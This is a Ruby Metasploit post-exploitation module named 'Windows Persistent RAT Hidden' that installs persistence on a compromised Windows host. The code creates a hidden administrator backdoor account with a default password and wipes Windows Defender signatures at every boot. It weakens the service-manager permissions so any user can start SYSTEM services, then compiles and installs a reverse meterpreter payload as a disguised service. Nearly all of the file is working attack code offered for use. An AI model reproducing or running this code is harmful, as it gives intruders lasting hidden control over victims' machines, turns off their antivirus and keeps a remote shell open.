require 'metasploit/framework/compiler/windows'

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Windows::Priv

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Persistent RAT Hidden',
        'Description' => %q{
          this module can give you a very strong footing and stay hidden. first the module will create a new user then add it to administrators group then hide the user created from login boot windows logo and module will remove windows malware signature every boot and module will modify registry to change administrator folder permissions so you can read write . then allow all users to create service with system account,
          privilege is required.
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'alwanzz@' ],
        'Platform' => [ 'windows' ],
        'Targets' => [['Windows', {}]],
        'SessionTypes' => [ 'meterpreter' ],
        'DefaultTarget' => 0,
        'References' => [
          [ 'URL', 'https://github.com/rapid7/metasploit-framework/blob/master/external/source/metsvc/src/metsvc.cpp' ]
        ],

        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              core_channel_eof
              core_channel_open
              core_channel_read
              core_channel_write
              stdapi_sys_config_getenv
              stdapi_sys_config_sysinfo
              stdapi_sys_process_execute
            ]
          }
        }
      )
    )

    register_options(
      [
        OptInt.new('RETRY_TIME', [false, 'The retry time that shell connect failed. 5 seconds as default.', 5 ]),
        OptString.new('UPLOAD_EXE_PATH', [false, 'The remote victim exe path to run. Use temp directory as default. ']),
        OptString.new('PAYLOAD_EXE_NAME', [false, 'The remote victim name. Random string as default.']),
        OptString.new('SERVICE_NAME', [false, 'The name of service. Random string as default.' ]),
        OptString.new('SERVICE_DESCRIPTION', [false, 'The description of service. Random string as default.' ])
      ]
    )
    datastore['USERNAME'] ||= 'security'
    datastore['PASSWORD'] ||= 'P@ssw0rd123'
    datastore['GROUPNAME'] ||= 'Administrators'
  end

  # Run Method for when run command is issued
  #-------------------------------------------------------------------------------
  def exploit
    username = datastore['USERNAME']
    password = datastore['PASSWORD']
    groupname = datastore['GROUPNAME']
    unless is_system? || is_admin?
      print_error("Insufficient privileges to create service")
      return
    end

    # Create a new user and add it to the administrators group
    output = cmd_exec("net user #{username} #{password} /add")
    if output.include? "account already exists."
    	print_error("username already in use")
    	print_error("Please add a username that is not already in the system")
    
    	return
    end
    
    if output.include? "successfully."
    	print_status("is creating a backdoor account '#{username}' '#{password}'") 
    	
    	
    else
    	print_error("access Danied. Pleas check your Permission.")
    
    	return
    end
    

    
    print_status("added the account #{username} to the #{groupname} group")
   
    cmd_exec("net localgroup #{groupname} #{username} /add")
    
    
    # Hide account from login logo
    print_status("hide account from login logo")
    cmd_exec("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /t REG_DWORD /v #{username} /d 0 /f")
    
    # Removed all windows defender signatures
    print_status("removed all windows defender signatures")
    cmd_exec("C:\\Program Files\\Windows Defender\\MpCmdRun.exe -RemoveDefinitions -All")
    cmd_exec("schtasks /create /tn \"Defender Security System\" /tr \"\\\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\\\" -RemoveDefinitions -All\" /sc onstart /ru System")
    
    # setting the security descriptor on the service manager
    print_status("setting the security descriptor on the service manager to allow anyone to start SYSTEM services!")
    cmd_exec("sc.exe sdset scmanager D:(A;;KA;;;WD)")
    
    # Allows read write administrator share folder
    print_status("allows read write administrator share folder")
    cmd_exec('reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f')
    print_good("success. have fun with your hidden account :)")  
    
    # backdoor services
    unless datastore['PAYLOAD'] =~ %r#^windows/(shell|meterpreter)/reverse#
      print_error("Only support for windows meterpreter/shell reverse staged payload")
      return
    end

    print_status("Running module against #{sysinfo['Computer']}")

    # Set variables
    rexepath = datastore['UPLOAD_EXE_PATH']
    @retry_time = datastore['RETRY_TIME']
    rexename = datastore['PAYLOAD_EXE_NAME'] || Rex::Text.rand_text_alpha(4..8)
    @service_name = datastore['SERVICE_NAME'] || Rex::Text.rand_text_alpha(4..8)
    @service_description = datastore['SERVICE_DESCRIPTION'] || Rex::Text.rand_text_alpha(8..16)

    # Add the windows pe suffix to rexename
    unless rexename.end_with?('.exe')
      rexename << ".exe"
    end

    host, _port = session.tunnel_peer.split(':')
    @clean_up_rc = ""

    buf = create_payload
    vprint_status(buf)
    metsvc_code = metsvc_template(buf)
    bin = Metasploit::Framework::Compiler::Windows.compile_c(metsvc_code)

    victim_path = write_exe_to_target(bin, rexename, rexepath)
    install_service(victim_path)

    clean_rc = log_file
    file_local_write(clean_rc, @clean_up_rc)
    print_status("Cleanup Meterpreter RC File: #{clean_rc}")

    report_note(host: host,
                type: "host.persistance.cleanup",
                data: {
                  local_id: session.sid,
                  stype: session.type,
                  desc: session.info,
                  platform: session.platform,
                  via_payload: session.via_payload,
                  via_exploit: session.via_exploit,
                  created_at: Time.now.utc,
                  commands: @clean_up_rc
                })
  end

  def create_payload
    p = payload.encoded
    Msf::Simple::Buffer.transform(p, 'c', 'buf')
  end

  # Function for writing executable to target host
  # Code from post/windows/manage/persistence_exe
  #
  def write_exe_to_target(rexe, rexename, rexepath)
    # check if we have write permission
    if rexepath
      begin
        temprexe = rexepath + "\\" + rexename
        write_file_to_target(temprexe, rexe)
      rescue Rex::Post::Meterpreter::RequestError
        print_warning("Insufficient privileges to write in #{rexepath}, writing to %TEMP%")
        temprexe = session.sys.config.getenv('TEMP') + "\\" + rexename
        write_file_to_target(temprexe, rexe)
      end

    # Write to %temp% directory if not set PAYLOAD_EXE_PATH
    else
      temprexe = session.sys.config.getenv('TEMP') + "\\" + rexename
      write_file_to_target(temprexe, rexe)
    end

    print_good("Meterpreter service exe written to #{temprexe}")

    @clean_up_rc << "execute -H -i -f taskkill.exe -a \"/f /im #{rexename}\"\n" # Use interact to wait until the task ended.
    @clean_up_rc << "rm \"#{temprexe.gsub("\\", "\\\\\\\\")}\"\n"

    temprexe
  end

  def write_file_to_target(temprexe, rexe)
    fd = session.fs.file.new(temprexe, "wb")
    fd.write(rexe)
    fd.close
  end

  # Function for creating log folder and returning log path
  #-------------------------------------------------------------------------------
  def log_file
    # Get hostname
    host = session.sys.config.sysinfo["Computer"]

    # Create Filename info to be appended to downloaded files
    filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")

    # Create a directory for the logs
    logs = ::File.join(Msf::Config.log_directory, 'persistence', Rex::FileUtils.clean_path(host + filenameinfo))

    # Create the log directory
    ::FileUtils.mkdir_p(logs)

    logs + ::File::Separator + Rex::FileUtils.clean_path(host + filenameinfo) + ".rc"
  end

  # Function to install payload as a service
  #-------------------------------------------------------------------------------
  def install_service(path)
    print_status("Creating service #{@service_name}")

    begin
      session.sys.process.execute("cmd.exe /c \"#{path}\" #{@install_cmd}", nil, { 'Hidden' => true })
    rescue ::Exception => e
      print_error("Failed to install the service.")
      print_error(e.to_s)
    end

    @clean_up_rc = "execute -H -f sc.exe -a \"delete #{@service_name}\"\n" + @clean_up_rc
    @clean_up_rc = "execute -H -f sc.exe -a \"stop #{@service_name}\"\n" + @clean_up_rc
  end

  def metsvc_template(buf)
    @install_cmd = Rex::Text.rand_text_alpha(4..8)
    @start_cmd = Rex::Text.rand_text_alpha(4..8)
    template = File.read(File.join(Msf::Config.data_directory, 'exploits', 'persistence_service', 'service.erb'))
    ERB.new(template).result(binding)
  end
end
